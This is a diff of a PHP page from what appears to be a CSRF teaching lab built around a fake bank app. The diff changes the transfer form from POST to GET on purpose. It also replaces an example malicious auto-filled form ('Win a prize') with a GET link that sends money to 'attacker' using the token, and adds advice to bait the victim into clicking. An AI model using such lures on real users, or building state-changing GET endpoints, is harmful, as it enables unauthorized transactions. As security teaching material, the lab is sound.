@@ -137,7 +137,7 @@ $_SESSION["token"] = $token;
 		</div>
 
 		<div class="container">
-		  <form action="<?php ?>" role="form" method="POST">
+		  <form action="<?php ?>" role="form" method="GET">
 		    <div class="form-group">
 		      <label for="name">Balance:</label> <span style=<?php if($_SESSION["sum"] > 0 )echo $pos_balance; else echo $neg_balance; ?>><?php echo $_SESSION["sum"]; ?> lei</span>
 		     
@@ -173,18 +173,16 @@ $_SESSION["token"] = $token;
 						<div id="collapse-1" class="panel-collapse collapse">
 							<div class="panel-body">
 								<ul class="list-group">
-									<li class="list-group-item "><pre><code>&lt;form action=&quot;http://localhost/bank3.php&quot; method=&quot;POST&quot;&gt;
-&lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;100000&quot;/&gt;
-&lt;input type=&quot;submit&quot; value=&quot;Win a prize&quot;/&gt;
-&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;<?php echo $token; ?>&quot;&gt;
-&lt;/form&gt;</code></pre></li>
+									<li class="list-group-item "><code>
+										GET http://localhost/bank3.php?destname=attacker&amount=34234234&token=<?php echo $token; ?>
+										</code></li>
 								</ul>
 								<div class="alert alert-warning alert-dismissable">
   									<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
-  									Create a site with the form and bait the victim to access it. Do not forget about the token! Make sure you &quot;guess&quot; the token.
+  									Bait the user to click this link
   								</div>
 							</div>
-						</div><!-- End Panel collapse -->						
+						</div><!-- End Panel collapse -->
 					</div>
 				</div>
 			</div>
